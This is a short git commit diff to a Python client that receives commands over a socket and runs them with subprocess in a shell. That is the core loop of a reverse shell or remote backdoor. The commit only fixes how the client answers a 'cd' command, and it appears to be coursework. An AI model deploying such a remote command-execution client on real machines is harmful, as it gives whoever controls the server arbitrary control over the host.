b8200e7f57d828acd6599a48c2e53074cb16c7d7
oribendror <oribendror@mail.tau.ac.il>
2025-04-06 23:40:24 +0300

    fix to cd printing error message when used

--- Client.py
+++ Client.py
@@ -12,6 +12,8 @@ while True:
     data = s.recv(1024)
     if data.decode("utf-8").startswith("cd "):
         os.chdir(data[3:].decode("utf-8"))
+        s.send(str.encode(str(os.getcwd() + '$ ')))  # Send the updated directory as a response
+        continue
     if len(data) > 0:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stderr= subprocess.PIPE,stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
